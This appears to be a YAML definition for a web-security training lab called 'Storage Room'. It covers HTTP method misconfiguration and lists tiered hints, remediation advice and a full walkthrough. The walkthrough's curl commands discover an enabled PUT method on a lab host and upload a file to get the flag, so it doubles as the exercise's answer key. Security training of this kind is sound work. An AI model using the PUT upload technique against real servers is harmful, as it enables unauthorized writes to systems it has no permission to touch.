slug: ewpt-http-method-mayhem
name: Storage Room
category: web
difficulty: easy
lab_kind: ewpt_102
est_minutes: 15
sort: 102
description: You have permission to investigate this isolated environment. Explore what is available and
  recover the flag.
hints:
- level: 1
  cost: 0
  body: Send OPTIONS /uploads/.
- level: 2
  cost: 5
  body: Check the Allow header.
- level: 3
  cost: 10
  body: If PUT is enabled, upload probe.txt, then request it.
remediation: Disable unused methods (PUT, DELETE, TRACE), enforce authorization, harden the Apache/nginx
  configuration.
walkthrough: 'curl -X OPTIONS http://target.lab.local/uploads/ shows Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS.
  curl -X PUT --data owned http://target.lab.local/uploads/probe.txt, then curl the same URL. The server
  returns the flag once probe.txt exists.'
dynamic_flag: true
